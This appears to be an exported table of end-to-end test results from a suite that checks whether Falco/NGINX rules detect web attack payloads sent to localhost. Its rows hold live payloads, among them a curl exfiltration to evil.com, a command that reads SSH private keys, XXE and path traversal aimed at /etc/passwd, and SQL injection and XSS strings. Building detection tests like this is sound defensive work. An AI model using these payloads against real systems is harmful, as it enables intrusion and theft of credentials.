"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `EMRG_REDIS_002` |
| **Name** | Redis configuration disclosure |
| **Category** | NOSQL |
| **Subcategory** | redis |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `CONFIG GET *`
- **Encoded**: `CONFIG%20GET%20%2A`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~6000ms
- **Timestamp**: 12:09:52.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] Redis command injection` |
| **Matched Rule** | `[NGINX Emerging Threat] Redis command injection test_id=EMRG_REDIS_002-1769861392345-xic9an pattern_id=EMRG_REDIS_002 uri=/?q=CONFIG%20GET%20%2A client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] Redis command injection test_id=EMRG_REDIS_002-1769861392345-xic9an pattern_id=EMRG_REDIS_002 uri=/?q=CONFIG%20GET%20%2A client=127.0.0.1

**Falco Log Entry**:
```
12:09:52.000000000: Critical [NGINX Emerging Threat] Redis command injection test_id=EMRG_REDIS_002-1769861392345-xic9an pattern_id=EMRG_REDIS_002 uri=/?q=CONFIG%20GET%20%2A client=127.0.0.1
```","1","test_e2e_with_logs[394_EMRG_REDIS_002]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_FILE_002` |
| **Name** | SSH key exfiltration |
| **Category** | CMDINJ |
| **Subcategory** | file_manipulation |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `&& cat ~/.ssh/id_rsa`
- **Encoded**: `%26%26%20cat%20~%2F.ssh%2Fid_rsa`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~22000ms
- **Timestamp**: 12:09:36.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_FILE_002-1769861376384-ejhxiw pattern_id=CMD_FILE_002 uri=/?q=%26%26%20cat%20~%2F.ssh%2Fid_rsa client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_FILE_002-1769861376384-ejhxiw pattern_id=CMD_FILE_002 uri=/?q=%26%26%20cat%20~%2F.ssh%2Fid_rsa client=127.0.0.1

**Falco Log Entry**:
```
12:09:36.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_FILE_002-1769861376384-ejhxiw pattern_id=CMD_FILE_002 uri=/?q=%26%26%20cat%20~%2F.ssh%2Fid_rsa client=127.0.0.1
```","2","test_e2e_with_logs[309_CMD_FILE_002]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_ENC_002` |
| **Name** | URL encoded AND operator with ls |
| **Category** | CMDINJ |
| **Subcategory** | encoded_commands |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `%26%26%20ls%20-la`
- **Encoded**: `%2526%2526%2520ls%2520-la`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~30000ms
- **Timestamp**: 12:09:28.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern` |
| **Matched Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_ENC_002-1769861368868-2otfrc pattern_id=CMD_ENC_002 uri=/?q=%2526%2526%2520ls%2520-la client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_ENC_002-1769861368868-2otfrc pattern_id=CMD_ENC_002 uri=/?q=%2526%2526%2520ls%2520-la client=127.0.0.1 method=GET

**Falco Log Entry**:
```
12:09:28.000000000: Warning [NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_ENC_002-1769861368868-2otfrc pattern_id=CMD_ENC_002 uri=/?q=%2526%2526%2520ls%2520-la client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[300_CMD_ENC_002]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_014` |
| **Name** | Multiple semicolons injection |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `;;ls`
- **Encoded**: `%3B%3Bls`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~41000ms
- **Timestamp**: 12:09:17.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via semicolon` |
| **Matched Rule** | `[NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_014-1769861357844-v8t7r pattern_id=CMD_BASIC_014 uri=/?q=%3B%3Bls client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_014-1769861357844-v8t7r pattern_id=CMD_BASIC_014 uri=/?q=%3B%3Bls client=127.0.0.1

**Falco Log Entry**:
```
12:09:17.000000000: Critical [NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_014-1769861357844-v8t7r pattern_id=CMD_BASIC_014 uri=/?q=%3B%3Bls client=127.0.0.1
```","1","test_e2e_with_logs[286_CMD_BASIC_014]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_NETDOC_001` |
| **Name** | XXE netdoc protocol file access |
| **Category** | XXE |
| **Subcategory** | protocol_abuse |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `<!ENTITY xxe SYSTEM ""netdoc:///etc/passwd"">`
- **Encoded**: `%3C%21ENTITY%20xxe%20SYSTEM%20%22netdoc%3A%2F%2F%2Fetc%2Fpasswd%22%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~29000ms
- **Timestamp**: 12:09:29.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] File inclusion attack detected` |
| **Matched Rule** | `[NGINX Traversal] File inclusion attack detected test_id=XXE_NETDOC_001-1769861369839-6t12u pattern_id=XXE_NETDOC_001 uri=/?q=%3C%21ENTITY%20xxe%20SYSTEM%20%22netdoc%3A%2F%2F%2Fetc%2Fpasswd%22%3E client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=XXE_NETDOC_001-1769861369839-6t12u pattern_id=XXE_NETDOC_001 uri=/?q=%3C%21ENTITY%20xxe%20SYSTEM%20%22netdoc%3A%2F%2F%2Fetc%2Fpasswd%22%3E client=127.0.0.1

**Falco Log Entry**:
```
12:09:29.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=XXE_NETDOC_001-1769861369839-6t12u pattern_id=XXE_NETDOC_001 uri=/?q=%3C%21ENTITY%20xxe%20SYSTEM%20%22netdoc%3A%2F%2F%2Fetc%2Fpasswd%22%3E client=127.0.0.1
```","2","test_e2e_with_logs[387_XXE_NETDOC_001]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_ADV_065` |
| **Name** | Curl Exfiltration |
| **Category** | CMDINJ |
| **Subcategory** | advanced |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `curl http://evil.com/$(whoami)`
- **Encoded**: `curl%20http%3A%2F%2Fevil.com%2F%24%28whoami%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~15000ms
- **Timestamp**: 12:09:43.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command substitution attack` |
| **Matched Rule** | `[NGINX CMDi] Command substitution attack test_id=CMD_ADV_065-1769861383402-68elzp pattern_id=CMD_ADV_065 uri=/?q=curl%20http%3A%2F%2Fevil.com%2F%24%28whoami%29 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command substitution attack test_id=CMD_ADV_065-1769861383402-68elzp pattern_id=CMD_ADV_065 uri=/?q=curl%20http%3A%2F%2Fevil.com%2F%24%28whoami%29 client=127.0.0.1

**Falco Log Entry**:
```
12:09:43.000000000: Critical [NGINX CMDi] Command substitution attack test_id=CMD_ADV_065-1769861383402-68elzp pattern_id=CMD_ADV_065 uri=/?q=curl%20http%3A%2F%2Fevil.com%2F%24%28whoami%29 client=127.0.0.1
```","1","test_e2e_with_logs[261_CMD_ADV_065]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_TRUNC_001` |
| **Name** | Null byte truncation |
| **Category** | PATH |
| **Subcategory** | truncation |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `../../../etc/passwd%00.jpg`
- **Encoded**: `..%2F..%2F..%2Fetc%2Fpasswd%2500.jpg`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~32000ms
- **Timestamp**: 12:09:26.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_TRUNC_001-1769861366374-ps05yr pattern_id=PATH_TRUNC_001 uri=/?q=..%2F..%2F..%2Fetc%2Fpasswd%2500.jpg client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_TRUNC_001-1769861366374-ps05yr pattern_id=PATH_TRUNC_001 uri=/?q=..%2F..%2F..%2Fetc%2Fpasswd%2500.jpg client=127.0.0.1

**Falco Log Entry**:
```
12:09:26.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_TRUNC_001-1769861366374-ps05yr pattern_id=PATH_TRUNC_001 uri=/?q=..%2F..%2F..%2Fetc%2Fpasswd%2500.jpg client=127.0.0.1
```","1","test_e2e_with_logs[238_PATH_TRUNC_001]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_POLY_010` |
| **Name** | HTML comment breaking polyglot |
| **Category** | XSS |
| **Subcategory** | polyglot |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `--><script>alert('XSS')</script><!--`
- **Encoded**: `--%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%3C%21--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~22000ms
- **Timestamp**: 12:09:36.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] Advanced XSS Attack Attempt` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_POLY_010-1769861376909-l49gla pattern_id=XSS_POLY_010 uri=/?q=--%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%3C%21-- client=127.0.0.1 method=GET` |
| **Rule Match** | ❌ Mismatch |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_POLY_010-1769861376909-l49gla pattern_id=XSS_POLY_010 uri=/?q=--%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%3C%21-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
12:09:36.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_POLY_010-1769861376909-l49gla pattern_id=XSS_POLY_010 uri=/?q=--%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%3C%21-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[165_XSS_POLY_010]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_UNICODE_001` |
| **Name** | Unicode slash encoding |
| **Category** | PATH |
| **Subcategory** | unicode_encoding |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `..%c0%afetc/passwd`
- **Encoded**: `..%25c0%25afetc%2Fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~41000ms
- **Timestamp**: 12:09:17.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_UNICODE_001-1769861357857-a1tr2h pattern_id=PATH_UNICODE_001 uri=/?q=..%25c0%25afetc%2Fpasswd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_UNICODE_001-1769861357857-a1tr2h pattern_id=PATH_UNICODE_001 uri=/?q=..%25c0%25afetc%2Fpasswd client=127.0.0.1

**Falco Log Entry**:
```
12:09:17.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_UNICODE_001-1769861357857-a1tr2h pattern_id=PATH_UNICODE_001 uri=/?q=..%25c0%25afetc%2Fpasswd client=127.0.0.1
```","2","test_e2e_with_logs[243_PATH_UNICODE_001]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_MUT_005` |
| **Name** | Listing tag mutation XSS |
| **Category** | XSS |
| **Subcategory** | mutation_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<listing><img src=x onerror=alert('XSS')></listing>`
- **Encoded**: `%3Clisting%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E%3C%2Flisting%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~43000ms
- **Timestamp**: 12:09:15.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] Polyglot XSS Attack` |
| **Matched Rule** | `[NGINX XSS] Polyglot XSS Attack test_id=XSS_MUT_005-1769861355863-6qui3o pattern_id=XSS_MUT_005 uri=/?q=%3Clisting%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E%3C%2Flisting%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] Polyglot XSS Attack test_id=XSS_MUT_005-1769861355863-6qui3o pattern_id=XSS_MUT_005 uri=/?q=%3Clisting%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E%3C%2Flisting%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
12:09:15.000000000: Critical [NGINX XSS] Polyglot XSS Attack test_id=XSS_MUT_005-1769861355863-6qui3o pattern_id=XSS_MUT_005 uri=/?q=%3Clisting%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E%3C%2Flisting%3E client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[155_XSS_MUT_005]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BOOL_005` |
| **Name** | Double quote boolean injection |
| **Category** | SQLI |
| **Subcategory** | boolean_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `"" OR ""1""=""1`
- **Encoded**: `%22%20OR%20%221%22%3D%221`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~51000ms
- **Timestamp**: 12:09:07.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_005-1769861347355-2kb46 pattern_id=SQLI_BOOL_005 uri=/?q=%22%20OR%20%221%22%3D%221 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_005-1769861347355-2kb46 pattern_id=SQLI_BOOL_005 uri=/?q=%22%20OR%20%221%22%3D%221 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
12:09:07.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_005-1769861347355-2kb46 pattern_id=SQLI_BOOL_005 uri=/?q=%22%20OR%20%221%22%3D%221 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[035_SQLI_BOOL_005]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BOOL_015` |
| **Name** | ASCII function test |
| **Category** | SQLI |
| **Subcategory** | boolean_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' OR ASCII('A')=65 --`
- **Encoded**: `'%20OR%20ASCII('A')%3D65%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~27000ms
- **Timestamp**: 12:09:31.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_015-1769861371906-ywz5cf pattern_id=SQLI_BOOL_015 uri=/?q='%20OR%20ASCII('A')%3D65%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_015-1769861371906-ywz5cf pattern_id=SQLI_BOOL_015 uri=/?q='%20OR%20ASCII('A')%3D65%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
12:09:31.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_015-1769861371906-ywz5cf pattern_id=SQLI_BOOL_015 uri=/?q='%20OR%20ASCII('A')%3D65%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[045_SQLI_BOOL_015]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_ERROR_003` |
| **Name** | UPDATEXML error-based injection |
| **Category** | SQLI |
| **Subcategory** | error_based |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `' AND UPDATEXML(1, CONCAT(0x7e, version(), 0x7e), 1) --`
- **Encoded**: `'%20AND%20UPDATEXML(1%2C%20CONCAT(0x7e%2C%20version()%2C%200x7e)%2C%201)%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~46000ms
- **Timestamp**: 12:09:12.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ERROR_003-1769861352367-r0yvzs pattern_id=SQLI_ERROR_003 uri=/?q='%20AND%20UPDATEXML(1%2C%20CONCAT(0x7e%2C%20version()%2C%200x7e)%2C%201)%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ERROR_003-1769861352367-r0yvzs pattern_id=SQLI_ERROR_003 uri=/?q='%20AND%20UPDATEXML(1%2C%20CONCAT(0x7e%2C%20version()%2C%200x7e)%2C%201)%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
12:09:12.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ERROR_003-1769861352367-r0yvzs pattern_id=SQLI_ERROR_003 uri=/?q='%20AND%20UPDATEXML(1%2C%20CONCAT(0x7e%2C%20version()%2C%200x7e)%2C%201)%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[061_SQLI_ERROR_003]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_2ND_002` |
| **Name** | Second-order boolean injection |
| **Category** | SQLI |
| **Subcategory** | second_order |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `user' OR '1'='1' --`
- **Encoded**: `user'%20OR%20'1'%3D'1'%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~44000ms
- **Timestamp**: 12:09:14.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_2ND_002-1769861354872-0gd32r pattern_id=SQLI_2ND_002 uri=/?q=user'%20OR%20'1'%3D'1'%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_2ND_002-1769861354872-0gd32r pattern_id=SQLI_2ND_002 uri=/?q=user'%20OR%20'1'%3D'1'%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
12:09:14.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_2ND_002-1769861354872-0gd32r pattern_id=SQLI_2ND_002 uri=/?q=user'%20OR%20'1'%3D'1'%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[002_SQLI_2ND_002]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BOOL_004` |
| **Name** | Alternative boolean condition |
| **Category** | SQLI |
| **Subcategory** | boolean_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' OR 'a'='a`
- **Encoded**: `%27%20OR%20%27a%27%3D%27a`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~53000ms
- **Timestamp**: 12:09:05.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_004-1769861345351-gtwa1 pattern_id=SQLI_BOOL_004 uri=/?q=%27%20OR%20%27a%27%3D%27a client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_004-1769861345351-gtwa1 pattern_id=SQLI_BOOL_004 uri=/?q=%27%20OR%20%27a%27%3D%27a client=127.0.0.1 method=GET

**Falco Log Entry**:
```
12:09:05.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_004-1769861345351-gtwa1 pattern_id=SQLI_BOOL_004 uri=/?q=%27%20OR%20%27a%27%3D%27a client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[034_SQLI_BOOL_004]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_ENV_001` |
| **Name** | Environment variable in PATH |
| **Category** | CMDINJ |
| **Subcategory** | env_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `PATH=/tmp:$PATH whoami`
- **Encoded**: `PATH%3D%2Ftmp%3A%24PATH%20whoami`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~26000ms
- **Timestamp**: 12:09:32.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_ENV_001-1769861372876-wio0j pattern_id=CMD_ENV_001 uri=/?q=PATH%3D%2Ftmp%3A%24PATH%20whoami client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_ENV_001-1769861372876-wio0j pattern_id=CMD_ENV_001 uri=/?q=PATH%3D%2Ftmp%3A%24PATH%20whoami client=127.0.0.1

**Falco Log Entry**:
```
12:09:32.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_ENV_001-1769861372876-wio0j pattern_id=CMD_ENV_001 uri=/?q=PATH%3D%2Ftmp%3A%24PATH%20whoami client=127.0.0.1
```","1","test_e2e_with_logs[305_CMD_ENV_001]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `EMRG_MONGO_004` |
| **Name** | MongoDB regex wildcard injection |
| **Category** | OTHER |
| **Subcategory** | mongodb_injection |
| **Severity** | `MEDIUM` |

## Attack Details

- **Payload**: `{""$regex"": "".*""}`
- **Encoded**: `%7B%22%24regex%22%3A%20%22.%2A%22%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~41000ms
- **Timestamp**: 12:09:17.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection` |
| **Matched Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_004-1769861357833-gdk164 pattern_id=EMRG_MONGO_004 uri=/?q=%7B%22%24regex%22%3A%20%22.%2A%22%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_004-1769861357833-gdk164 pattern_id=EMRG_MONGO_004 uri=/?q=%7B%22%24regex%22%3A%20%22.%2A%22%7D client=127.0.0.1

**Falco Log Entry**:
```
12:09:17.000000000: Critical [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_004-1769861357833-gdk164 pattern_id=EMRG_MONGO_004 uri=/?q=%7B%22%24regex%22%3A%20%22.%2A%22%7D client=127.0.0.1
```","2","test_e2e_with_logs[384_EMRG_MONGO_004]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
